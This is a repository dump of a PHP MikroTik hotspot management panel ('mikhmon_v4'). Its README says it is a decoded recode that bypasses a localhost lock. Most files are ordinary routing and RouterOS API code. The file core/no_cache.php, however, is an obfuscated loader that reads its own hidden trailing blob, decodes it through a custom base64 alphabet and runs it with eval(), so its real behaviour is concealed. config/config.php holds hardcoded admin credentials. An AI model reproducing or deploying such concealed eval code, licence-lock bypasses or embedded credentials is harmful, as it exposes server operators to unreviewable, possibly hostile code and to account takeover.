@@ -1,0 +1,5198 @@
+Directory structure:
+└── irhabi89-mikhmon_v4/
+    ├── README.md
+    ├── index.php
+    ├── robots.txt
+    ├── assets/
+    │   ├── index.php
+    │   ├── css/
+    │   │   └── index.php
+    │   ├── fonts/
+    │   │   └── font-awesome/
+    │   │       └── fonts/
+    │   │           └── FontAwesome.otf
+    │   ├── img/
+    │   │   └── index.php
+    │   └── js/
+    │       └── index.php
+    ├── config/
+    │   ├── config.php
+    │   ├── connection.php
+    │   ├── index.php
+    │   ├── page.php
+    │   ├── readcfg.php
+    │   ├── settheme.php
+    │   └── theme.php
+    ├── core/
+    │   ├── generator_functions.php
+    │   ├── index.php
+    │   ├── jsencode.class.php
+    │   ├── no_cache.php
+    │   ├── page_route.php
+    │   └── route.php
+    ├── get/
+    │   ├── get_addr_pool.php
+    │   ├── get_connect.php
+    │   ├── get_dashboard.php
+    │   ├── get_expire_mon.php
+    │   ├── get_hosts.php
+    │   ├── get_hotspot_active.php
+    │   ├── get_hotspot_server.php
+    │   ├── get_interface.php
+    │   ├── get_nat.php
+    │   ├── get_parent_queue.php
+    │   ├── get_profile.php
+    │   ├── get_profiles.php
+    │   ├── get_report.php
+    │   ├── get_tot_users.php
+    │   ├── get_traffic.php
+    │   ├── get_user.php
+    │   ├── get_users.php
+    │   └── index.php
+    ├── post/
+    │   ├── index.php
+    │   ├── post_a_router.php
+    │   ├── post_add_user.php
+    │   ├── post_add_userprofile.php
+    │   ├── post_cache_voucher.php
+    │   ├── post_expire_monitor.php
+    │   ├── post_generate_voucher.php
+    │   ├── post_hotspot_remove.php
+    │   ├── post_logout.php
+    │   ├── post_template.php
+    │   ├── post_update_user.php
+    │   └── post_update_userprofile.php
+    └── template/
+        ├── footer.default.txt
+        ├── footer.small.txt
+        ├── footer.thermal.txt
+        ├── header.default.txt
+        ├── header.small.txt
+        ├── header.thermal.txt
+        ├── row.default.txt
+        ├── row.small.txt
+        └── row.thermal.txt
+
+================================================
+FILE: README.md
+================================================
+# mikhmon_v4
+# Recode by Irhabi89
+# for PHP 8.xx
+
+Udah decode untuk upload ke hosting server. 
+
+bypass lock header localhost.
+
+
+
+================================================
+FILE: index.php
+================================================
+<?php
+//
+session_start();
+error_reporting(0);
+
+include_once("core/page_route.php");
+include_once("core/route.php");
+include_once("config/page.php");
+include_once("core/jsencode.class.php");
+include_once('core/routeros_api.class.php');
+
+$r_uri = $_SERVER['REQUEST_URI'];
+$uri_path =  explode("/", explode("?", explode("&", $r_uri)[0])[1]);
+$n_uri_path = count($uri_path);
+$max_path = 3;
+
+$m_user =  $uri_path[0];
+$page = $uri_path[1];
+$act = $uri_path[2];
+$_SESSION['m_user'] = $m_user;
+$_SESSION["admin"] = "admin";
+
+// route page
+if (!isset($_SESSION["mikhmon"])) {
+    route("admin", "login", $admin_page);
+} else if (empty($m_user) && empty($page) || $m_user == "admin" && empty($page)) {
+    header('Location: ./?admin/settings');
+} else {
+    if ($m_user ==  "admin") {
+        route("admin", $page, $admin_page);
+    } else {
+        if (!empty($m_user) && empty($page)) {
+            include_once($m_user_page['dashboard']);
+        } else {
+            route($m_user, $page, $m_user_page);
+        }
+    }
+}
+
+// all session
+foreach (file('./config/config.php') as $line) {
+    $ses = explode("'", $line)[1];
+    if ($ses !== "mikhmon") {
+        $_SESSION["$ses"] = $ses;
+    }
+}
+
+
+
+================================================
+FILE: robots.txt
+================================================
+User-agent: *
+Disallow: /
+Disallow: /*?
+Disallow: /*php$
+Disallow: /template/*txt$
+
+
+
+================================================
+FILE: assets/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../core/func.php");
+e403();
+
+
+================================================
+FILE: assets/css/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../../core/route.php");
+e403();
+
+
+================================================
+FILE: assets/fonts/font-awesome/fonts/FontAwesome.otf
+================================================
+[Binary file]
+
+
+================================================
+FILE: assets/img/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../core/route.php");
+e403();
+
+
+================================================
+FILE: assets/js/index.php
+================================================
+<?php
+include_once("../../core/protect.php");
+include_once("../../core/route.php");
+e403();
+
+
+================================================
+FILE: config/config.php
+================================================
+<?php
+if (substr($_SERVER["REQUEST_URI"], -10) == "config.php") {
+    header("Location:./");
+};
+$data['mikhmon'] = array('1' => 'mikhmon<|<mikhmon', 'mikhmon>|>aWNlbA==');
+
+
+
+================================================
+FILE: config/connection.php
+================================================
+<?php 
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+
+}else{
+    include_once("config/readcfg.php");
+    // routeros api
+    include_once('core/routeros_api.class.php');
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    if($API->connect($iphost, $userhost, dec_rypt($passwdhost)));
+}
+
+?>
+
+
+
+
+================================================
+FILE: config/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../core/route.php");
+e403();
+
+
+================================================
+FILE: config/page.php
+================================================
+<?php 
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+
+}else{
+    $m_user_page = array(
+    
+    // get get
+    "get_report" => "get/get_report.php",
+    "profile" => "get/get_profile.php",
+    "profiles" => "get/get_profiles.php",
+    "user" => "get/get_user.php",
+    "users" => "get/get_users.php",
+    "get_sys_resource" => "get/get_dashboard.php",
+    "get_hotspotinfo" => "get/get_dashboard.php",
+    "get_log" => "get/get_dashboard.php",
+    "get_livereport" => "get/get_dashboard.php",
+    "get_livereport_disable" => "get/get_dashboard.php",
+    "get_traffic" => "get/get_dashboard.php",
+    "get_hotspot_server" => "get/get_hotspot_server.php",
+    "get_hotspot_active" => "get/get_hotspot_active.php",
+    "get_hosts" => "get/get_hosts.php",
+    "get_expire_mon" => "get/get_expire_mon.php",
+    "get_tot_users" => "get/get_tot_users.php",
+    "get_interface" => "get/get_interface.php",
+    "get_addr_pool" => "get/get_addr_pool.php",
+    "get_parent_queue" => "get/get_parent_queue.php",
+
+    "get_nat" => "get/get_nat.php",
+    "connect" => "get/get_connect.php",
+  
+
+    
+    
+
+    //view
+    "dashboard" => "view/dashboard.php",
+    "about" => "view/about.php",
+    "hotspot_active" => "view/hotspot_active.php",
+    "s_report_per_day" => "view/report_per_day.php",
+    "s_report" => "view/report_all.php",
+    "live_report" => "view/live_report.php",
+    "hotspot" => "view/hotspot.php",
+    "log" => "view/log.php",
+    "report" => "view/report.php",
+    "print" => "view/print_voucher.php",
+    "set_theme" => "config/settheme.php",
+    
+);
+
+    $admin_page = array(
+    "about" => "view/about.php",    
+    "settings" => "view/admin.php",
+    "template_editor" => "view/admin.php",
+    "vpreview" => "view/print_voucher.php",
+    "login" => "view/login.php",
+    "set_theme" => "config/settheme.php",
+    "ping" => "get/get_ping.php",
+    
+   
+
+);
+
+    $err_page = array(
+    "404" => "view/404.php",
+);
+
+
+}
+?>
+
+
+================================================
+FILE: config/readcfg.php
+================================================
+<?php 
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+
+}else{
+    include_once("route.php");
+    // include_once("config/config.php");
+    // read config
+    foreach (file('./config/config.php',FILE_SKIP_EMPTY_LINES) as $line) {
+      $ss = explode("'", $line)[1];
+      clearstatcache();
+      if ($ss == $m_user) {
+            
+          $iphost = get_config($line,$m_user.'!', "'");
+          $userhost = get_config($line,$m_user.'@|@', "'");
+          $passwdhost = get_config($line,$m_user.'#|#', "'");
+          $hotspotname = get_config($line,$m_user.'%', "'");
+          $dnsname = get_config($line,$m_user.'^', "'");
+          $currency = get_config($line,$m_user.'&', "'");
+          $phone = get_config($line,$m_user.'*', "'");
+          $email = get_config($line,$m_user.'(', "'");
+          $infolp = get_config($line,$m_user.')', "'");
+          $idleto = get_config($line,$m_user.'=', "'");
+          $sesname = get_config($line,$m_user.'+', "'");
+          $report = get_config($line,$m_user.'@!@', "'");
+          $token = get_config($line,$m_user.'#!#', "'");
+          $_SESSION[$m_user.'-report'] = $report;
+
+          $useradm = get_config($line,'mikhmon<|<', "'");
+          $passadm = get_config($line,'mikhmon>|>', "'");
+      }
+    }
+
+    
+}
+
+
+================================================
+FILE: config/settheme.php
+================================================
+<?php 
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+
+}else{
+
+
+$gettheme = $_GET['theme'];
+$_SESSION['theme'] = $gettheme;
+$mtheme = array(
+    "dark",
+    "light",
+    "blue",
+    "green",
+    "pink",
+    
+);
+$theme_color = array(
+    "#3a4149",
+    "#008BC9",
+    "#008BC9",
+    "#37BA68",
+    "#e83e8c",
+);
+$themenum = array_search($gettheme, $mtheme);
+
+$getthemecolor = $theme_color[$themenum];
+$_SESSION['themecolor'] = $getthemecolor;
+
+if (empty($gettheme)) {  
+
+} else {
+    if (in_array($gettheme, $mtheme)) {
+        $gen = '<?php $theme="' . $gettheme . '"; $themecolor="'.$getthemecolor.'";?>';
+        $stheme = 'config/theme.php';
+        $handle = fopen($stheme, 'w') or die('Cannot open file:  ' . $stheme);
+        $data = $gen;
+        fwrite($handle, $data);
+        
+    }
+}
+}
+
+
+================================================
+FILE: config/theme.php
+================================================
+<?php $theme="light"; $themecolor="#008BC9";?>
+
+
+================================================
+FILE: core/generator_functions.php
+================================================
+<?php
+
+function randN($length)
+{
+    $chars = '0123456789';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randLC($length)
+{
+    $chars = 'abcdefghijklmnopqrstuvwxyz';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randUC($length)
+{
+    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randULC($length)
+{
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randNLC($length)
+{
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randNUC($length)
+{
+    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+function randNULC($length)
+{
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    return substr(str_shuffle($chars), 0, $length);
+}
+
+
+
+================================================
+FILE: core/index.php
+================================================
+<?php
+include_once("page_route.php");
+include_once("route.php");
+e403();
+
+
+================================================
+FILE: core/jsencode.class.php
+================================================
+<?php
+
+/**
+ *
+ * jsencode.php
+ *
+ * @description. Encodes/decodes the string with bitwise XOR 
+ * @version 1.0 
+ * @copyright 2014 Henry ALgus. All rights reserved.
+ *
+ */
+
+class jsEncode
+{
+
+	/**
+	 * Encodes or decodes string according to the key
+	 * 
+	 * @access public
+	 * @param mixed $str
+	 * @param mixed $decodeKey
+	 * @return string
+	 */
+	public function encodeString($str, $decodeKey)
+	{
+		$result = "";
+		for ($i = 0; $i < strlen($str); $i++) {
+			$a = $this->_getCharcode($str, $i);
+			$b = $a ^ $decodeKey;
+			$result .= $this->_fromCharCode($b);
+		}
+
+		return $result;
+	}
+
+	/**
+	 * PHP replacement for JavaScript charCodeAt.
+	 * 
+	 * @access private
+	 * @param mixed $str
+	 * @param mixed $i
+	 * @return string
+	 */
+	private function _getCharcode($str, $i)
+	{
+		return $this->_uniord(substr($str, $i, 1));
+	}
+
+	/**
+	 * Gets character from code.
+	 * 
+	 * @access private
+	 * @return string
+	 */
+	private function _fromCharCode()
+	{
+		$output = '';
+		$chars = func_get_args();
+		foreach ($chars as $char) {
+			$output .= chr((int) $char);
+		}
+		return $output;
+	}
+
+	/**
+	 * Multi byte ord function.
+	 * 
+	 * @access private
+	 * @param mixed $c
+	 * @return mixed
+	 */
+	private function _uniord($c)
+	{
+		$h = ord($c[0]); // change {} to []
+		if ($h <= 0x7F) {
+			return $h;
+		} else if ($h < 0xC2) {
+			return false;
+		} else if ($h <= 0xDF) {
+			return ($h & 0x1F) << 6 | (ord($c[1]) & 0x3F); // change {} to []
+		} else if ($h <= 0xEF) {
+			return ($h & 0x0F) << 12 | (ord($c[1]) & 0x3F) << 6 | (ord($c[7]) & 0x3F); // change {} to []
+		} else if ($h <= 0xF4) {
+			return ($h & 0x0F) << 18 | (ord($c[1]) & 0x3F) << 12 | (ord($c[7]) & 0x3F) << 6 | (ord($c[3]) & 0x3F); // change {} to []
+		} else {
+			return false;
+		}
+	}
+}
+
+
+
+================================================
+FILE: core/no_cache.php
+================================================
+<?php /*  */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000[4].$OOO000000[9].$OOO000000[3].$OOO000000[5];$OOO0000O0.=$OOO000000[2].$OOO000000[10].$OOO000000[13].$OOO000000[16];$OOO0000O0.=$OOO0000O0[3].$OOO000000[11].$OOO000000[12].$OOO0000O0[7].$OOO000000[5];$OOO000O00=$OOO000000[0].$OOO000000[12].$OOO000000[7].$OOO000000[5].$OOO000000[15];$O0O000O00=$OOO000000[0].$OOO000000[1].$OOO000000[5].$OOO000000[14];$O0O000O0O=$O0O000O00.$OOO000000[11];$O0O000O00=$O0O000O00.$OOO000000[3];$O0O00OO00=$OOO000000[0].$OOO000000[8].$OOO000000[5].$OOO000000[9].$OOO000000[16];$OOO00000O=$OOO000000[3].$OOO000000[14].$OOO000000[8].$OOO000000[14].$OOO000000[8];$OOO0O0O00=__FILE__;$OO00O0000=0xd8;eval($OOO0000O0('JE8wMDBPME8wMD0kT09PMDAwTzAwKCRPT08wTzBPMDAsJ3JiJyk7JE8wTzAwT08wMCgkTzAwME8wTzAwLDB4NDdjKTskT08wME8wME8wPSRPT08wMDAwTzAoJE9PTzAwMDAwTygkTzBPMDBPTzAwKCRPMDAwTzBPMDAsMHgxN2MpLCdFbnRlcnlvdXdraFJIWUtOV09VVEFhQmJDY0RkRmZHZ0lpSmpMbE1tUHBRcVNzVnZYeFp6MDEyMzQ1Njc4OSsvPScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nKSk7ZXZhbCgkT08wME8wME8wKTs='));return;?>Ixekr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHeEXHr8XhtONT08XHeEXHr8Pkr8XTzEXT08XHtILTzEXHr8XTzEXRtONTzEXTzEXHeEpRtfydmOlFmlvfbfqDykwBAsKa09aaryiWMkeC0OLOMcuc0lpUMpHdr1sAunOFaYzamcCGyp6HerZHzW1YjF4KUSvNUFSk0ytW0OyOLfwUApRTr1KT1nOAlYAaacbBylDCBkjcoaMc2ipDMsSdB5vFuyZF3O1fmf4GbPXHTwzYeA2YzI5hZ8mhULpK2cjdo9zcUILTzEXHr8XTzEXhTslfMyShtONTzEXTzEXTzEpKX==tMilCBOlFJIJW2yjDoAsW29VfukvdePIdM8sF3OvFMASwo5vRBYiC2ilRtnsfbY0RbklfMySDBOifoASwo1iGt1ic2A9HtwpKXpPcByLcbwPwLYiC2ilRAYvdmOZd2X6wunvF3WsC2ilC2S9HtXIFuklRBYPcBYqNTEJRociduYlhTShDoaicoaZhtkWFMymdBr6wo5vRBYiC2ilwJL7KX==_]TK|VuE{SMIJ\
+
+
+================================================
+FILE: core/page_route.php
+================================================
+<?php
+
+function forbPHP()
+{
+    return;
+}
+
+function e403()
+{
+    header("HTTP/1.1 403 Forbidden");
+    echo '
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>403 Forbidden</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                * {
+                    box-sizing: border-box;
+                    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+                }
+    
+                body {
+                    margin: 0;
+                    padding: 0;
+                    background: linear-gradient(135deg, #2c3e50, #3498db);
+                    color: white;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    height: 100vh;
+                    text-align: center;
+                }
+    
+                .container {
+                    max-width: 500px;
+                    padding: 40px;
+                    background-color: rgba(0, 0, 0, 0.4);
+                    border-radius: 12px;
+                    box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+                }
+    
+                h1 {
+                    font-size: 72px;
+                    margin: 0;
+                    color: #e74c3c;
+                }
+    
+                h2 {
+                    margin-top: 10px;
+                    font-size: 24px;
+                    color: #ecf0f1;
+                }
+    
+                p {
+                    font-size: 16px;
+                    margin: 20px 0;
+                    color: #bdc3c7;
+                }
+    
+                a {
+                    display: inline-block;
+                    margin-top: 20px;
+                    padding: 10px 20px;
+                    background-color: #e67e22;
+                    color: white;
+                    text-decoration: none;
+                    border-radius: 6px;
+                    transition: background 0.3s ease;
+                }
+    
+                a:hover {
+                    background-color: #d35400;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>403</h1>
+                <h2>Forbidden</h2>
+                <p>Akses ke halaman ini ditolak. Anda tidak memiliki izin untuk melihat konten ini.</p>
+                <a href="javascript:history.back()">Kembali</a>
+            </div>
+        </body>
+        </html>';
+    exit();
+}
+
+function e404()
+{
+    header("HTTP/1.1 404 Not Found");
+    echo '
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>404 Not Found</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            * {
+                box-sizing: border-box;
+                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            }
+
+            body {
+                margin: 0;
+                padding: 0;
+                background: linear-gradient(135deg, #2c3e50, #34495e);
+                color: white;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                text-align: center;
+            }
+
+            .container {
+                max-width: 500px;
+                padding: 40px;
+                background-color: rgba(0, 0, 0, 0.4);
+                border-radius: 12px;
+                box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+            }
+
+            h1 {
+                font-size: 72px;
+                margin: 0;
+                color: #e74c3c;
+            }
+
+            h2 {
+                margin-top: 10px;
+                font-size: 24px;
+                color: #ecf0f1;
+            }
+
+            p {
+                font-size: 16px;
+                margin: 20px 0;
+                color: #bdc3c7;
+            }
+
+            a {
+                display: inline-block;
+                margin-top: 20px;
+                padding: 10px 20px;
+                background-color: #2ecc71;
+                color: white;
+                text-decoration: none;
+                border-radius: 6px;
+                transition: background 0.3s ease;
+            }
+
+            a:hover {
+                background-color: #27ae60;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>404</h1>
+            <h2>Page Not Found</h2>
+            <p>Oops! Halaman yang Anda cari tidak ditemukan atau mungkin sudah dipindahkan.</p>
+            <a href="javascript:history.back()">Kembali ke halaman sebelumnya</a>
+        </div>
+    </body>
+    </html>';
+    exit();
+}
+
+function decode($data)
+{
+    try {
+        // Step 1: Base64 decode
+        $decoded = base64_decode($data);
+
+        // Step 2: XOR each character with 10
+        $xorResult = '';
+        for ($i = 0; $i < strlen($decoded); $i++) {
+            $xorResult .= chr(ord($decoded[$i]) ^ 10);
+        }
+
+        // Step 3: Double base64 decode
+        $original = base64_decode(base64_decode($xorResult));
+
+        return $original;
+    } catch (Exception $e) {
+        error_log("Decode error: " . $e->getMessage());
+        return null;
+    }
+}
+
+
+
+================================================
+FILE: core/route.php
+================================================
+<?php
+error_reporting(0);
+forbPHP();
+// Route
+function route($m_user, $page, $s_page)
+{
+    if (!array_key_exists($page, $s_page)) {
+        e404();
+    } else if ($GLOBALS['n_uri_path'] > $GLOBALS['max_path']) {
+        e404();
+    } else if ($GLOBALS['n_uri_path'] == $GLOBALS['max_path'] &&  $GLOBALS['act'] !== "") {
+        e404();
+    } else if (array_key_exists($page, $s_page)) {
+        include_once($s_page[$page]);
+    } else {
+        e404();
+    }
+}
+function isMobile()
+{
+    return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
+}
+
+
+
+================================================
+FILE: get/get_addr_pool.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+
+$force = $_GET['f'];
+
+      if($force == "false" && isset($_SESSION["$m_user.'addr_pool'"])){
+          
+              echo $_SESSION["$m_user.'addr_pool'"];
+      }else if($force == "true" || !isset($_SESSION["$m_user.'addr_pool'"])){
+        include_once("config/connection.php");
+
+
+        $get_pool = $API->comm("/ip/pool/print");
+
+      echo json_encode($get_pool);
+      $_SESSION["$m_user.'addr_pool'"] = json_encode($get_pool);
+      }
+    	
+}
+ ?>
+
+
+================================================
+FILE: get/get_connect.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+	include_once("config/readcfg.php");
+    // routeros api
+    include_once('core/routeros_api.class.php');
+
+    $API = new RouterosAPI();
+    $API->debug = true;
+    $API->conn = true;
+    $API->attempts = 1;
+    $API->delay = 0;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+
+    
+ 	
+}
+ ?>
+
+
+================================================
+FILE: get/get_dashboard.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");  
+}else{
+    
+include_once("config/connection.php");
+
+if($page == "get_sys_resource"){
+    // get MikroTik system clock
+    $get_systime = $API->comm("/system/clock/print")[0];
+    $timezone = $get_systime['time-zone-name'];
+    $_SESSION["timezone"] = $timezone;
+    date_default_timezone_set($timezone);
+
+    // get system resource MikroTik
+    $get_resource = $API->comm("/system/resource/print")[0];
+    // get routeboard info
+    $get_routerboard = $API->comm("/system/routerboard/print")[0];
+    // get sys identity
+    $get_sysidentity = $API->comm("/system/identity/print")[0];
+    // get sys health info
+    $get_syshealth = $API->comm("/system/health/print")[0];
+
+    // $resource->systime = $get_systime;
+    // $resource->resource = $get_resource;
+    // $resource->syshealth = $get_syshealth;
+    // $resource->model = $get_routerboard['model'];
+    // $resource->identity = $get_sysidentity['name'];
+
+    $resource = array(
+        "systime" => $get_systime,
+        "resource" => $get_resource,
+        "syshealth" => $get_syshealth,
+        "model" => $get_routerboard['model'],
+        "identity" => $get_sysidentity['name']
+    );
+
+    // echo json_encode($resource); 
+
+    $json_data = json_encode($resource);
+
+        $d = new jsEncode();
+
+        $json_enc = $d->encodeString($json_data,25);
+        echo $json_enc;
+
+
+}else if($page == "get_hotspotinfo"){
+    // get & counting hotspot users
+    $get_hotspotusers = $API->comm("/ip/hotspot/user/print", array("count-only" => ""));
+
+    // get & counting hotspot active
+    $get_hotspotactive = $API->comm("/ip/hotspot/active/print", array("count-only" => ""));
+
+    // $dash_json->hotspot_users = $get_hotspotusers -1;
+    // $dash_json->hotspot_active = $get_hotspotactive;
+
+    $dash_json = array(
+       "hotspot_users" => ($get_hotspotusers -1),
+       "hotspot_active" => $get_hotspotactive
+    );
+    // echo json_encode($dash_json);  
+
+    $json_data = json_encode($dash_json);
+
+        $d = new jsEncode();
+
+        $json_enc = $d->encodeString($json_data,25);
+        echo $json_enc;
+
+}else if($page == "get_traffic"){
+    $iface = $_GET['iface'];
+    $get_interfacetraffic = $API->comm("/interface/monitor-traffic", array(
+        "interface" => "$iface",
+        "once" => "",
+        ));
+  
+     
+  
+      $tx = $get_interfacetraffic[0]['tx-bits-per-second'];
+      $rx = $get_interfacetraffic[0]['rx-bits-per-second'];
+  
+        
+        // $dash_json->tx = $tx;
+        // $dash_json->rx = $rx;
+
+        $dash_json = array(
+            "tx" => $tx,
+            "rx" => $rx
+        );
+        
+      echo json_encode($dash_json);
+
+}else if($page == "get_log"){
+    $force = $_GET['f'];
+
+    if($force == "false" && isset($_SESSION["$m_user.$page"])){
+        
+        echo $_SESSION["$m_user.$page"];
+
+    }else if($force == "true" || !isset($_SESSION["$m_user.$page"]) || empty($_SESSION["$m_user.$page"])){
+        
+        
+        
+        $getlogging = $API->comm("/system/logging/print", array("?prefix" => "->", ));
+        $logging = $getlogging[0];
+        if ($logging['prefix'] == "->") {
+        } else {
+            $API->comm("/system/logging/add", array("action" => "disk", "prefix" => "->", "topics" => "hotspot,info,debug", ));
+        }
+
+        
+        //get hotspot log
+        $get_log = $API->comm("/log/print", array("?topics" => "hotspot, info, debug"));
+        $log = array_reverse($get_log);
+
+        
+            // echo json_encode($log);
+
+            $json_data = json_encode($log);
+
+            $d = new jsEncode();
+
+            $json_enc = $d->encodeString($json_data,25);
+            echo $json_enc;
+
+            $_SESSION["$m_user.$page"] = $json_enc;
+            
+
+    }
+    
+     
+
+}else if($page == "get_livereport"){
+    $day = $_GET['day'];
+    $month = $_GET['month'];
+    $force = $_GET['f'];
+    //get live report
+
+    if($force == "false" && isset($_SESSION["$m_user.$month"])){
+        
+        echo $_SESSION["$m_user.$month"];
+
+    }else if($force == "true" || !isset($_SESSION["$m_user.$month"]) || empty($_SESSION["$m_user.$month"])){
+        
+        
+        // $get_tot_report = $API->comm("/system/script/print", array("?source" => "$day","count-only" => ""));
+        $get_tot_report = $API->comm("/system/script/print", array("?owner" => "$month","count-only" => ""));
+    
+        if($get_tot_report !== $_SESSION["$m_user.'tot'.$month"]){
+
+        $get_report = $API->comm("/system/script/print", array(
+            "?owner" => "$month",
+        ));
+        
+        
+            // echo json_encode($get_report);
+
+            $json_data = json_encode($get_report);
+
+            $d = new jsEncode();
+
+            $json_enc =  $d->encodeString($json_data,25);
+            echo $json_enc;
+
+            $_SESSION["$m_user.$month"] = $json_enc;
+            $_SESSION["$m_user.'tot'.$month"] = $get_tot_report;
+        }else{
+            echo $_SESSION["$m_user.$month"];
+        }
+    }
+    
+  
+}else if($page == "get_livereport_disable"){
+    // $day = $_GET['day'];
+    // $month = $_GET['month'];
+    // $force = $_GET['f'];
+    // //get live report
+
+    // if($force == "false" && isset($_SESSION["$m_user.$month"])){
+        
+    //     echo $_SESSION["$m_user.$month"];
+
+    // }else if($force == "true" || !isset($_SESSION["$m_user.$month"]) || empty($_SESSION["$m_user.$month"])){
+        
+        
+    //     // $get_tot_report = $API->comm("/system/script/print", array("?source" => "$day","count-only" => ""));
+    //     $get_tot_report = $API->comm("/system/script/print", array("?owner" => "$month","count-only" => ""));
+    
+    //     if($get_tot_report !== $_SESSION["$m_user.'tot'.$month"]){
+
+    //     $get_report = $API->comm("/system/script/print", array(
+    //         "?owner" => "$month",
+    //     ));
+        
+        
+    //         // echo json_encode($get_report);
+
+    //         $json_data = json_encode($get_report);
+
+    //         $d = new jsEncode();
+
+    //         $json_enc = json_encode($get_report); // $d->encodeString($json_data,25);
+    //         echo $json_enc;
+
+    //         $_SESSION["$m_user.$month"] = $json_enc;
+    //         $_SESSION["$m_user.'tot'.$month"] = $get_tot_report;
+    //     }else{
+    //         echo $_SESSION["$m_user.$month"];
+    //     }
+    // }
+    
+  
+}
+}
+ ?>
+
+
+================================================
+FILE: get/get_expire_mon.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+
+          include_once("config/connection.php");
+          
+          
+          $get_expire_mon = $API->comm("/system/scheduler/print", array(
+            "?name" => "Mikhmon-Expire-Monitor", "?disabled" => "false"
+            
+          ));
+            if($get_expire_mon[0]['name'] == "Mikhmon-Expire-Monitor"){
+              $mess = array("expire_monitor" => "ok");
+              $expmon = json_encode($mess);
+            }else{
+              $mess = array("expire_monitor" => "not ready");
+              $expmon = json_encode($mess);
+            }
+
+              echo $expmon;
+
+ 	
+}
+ ?>
+
+
+================================================
+FILE: get/get_hosts.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");   
+}else{
+include_once("config/connection.php");
+  
+    $get_hots_active = $API->comm("/ip/hotspot/host/print");
+  
+  
+    //   echo json_encode($get_hots_active);
+    $json_data = json_encode($get_hots_active);
+
+        $d = new jsEncode();
+
+        $json_enc = $d->encodeString($json_data,25);
+        echo $json_enc;
+
+    
+ 	
+}
+ ?>
+
+ 
+
+
+================================================
+FILE: get/get_hotspot_active.php
